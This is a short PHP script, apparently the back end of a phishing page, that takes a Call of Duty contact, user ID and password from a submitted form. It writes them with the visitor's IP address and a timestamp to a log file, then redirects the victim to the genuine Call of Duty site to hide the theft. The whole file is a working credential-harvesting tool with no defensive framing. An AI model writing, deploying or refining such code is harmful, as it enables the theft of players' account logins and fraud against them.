<?php
date_default_timezone_set("Asia/Kolkata");

$contact = $_POST['contact'] ?? 'N/A';
$uid = $_POST['uid'] ?? 'N/A';
$pass = $_POST['password'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date("Y-m-d H:i:s");

$log = "[$timestamp] IP: $ip | Contact: $contact | UID: $uid | Pass: $pass\n";

// Save to correct log
file_put_contents("../../logs/cod.log", $log, FILE_APPEND);

// Optional: terminal echo
echo $log;

// Optional redirect
header("Location: https://www.callofduty.com/");
exit();
?>
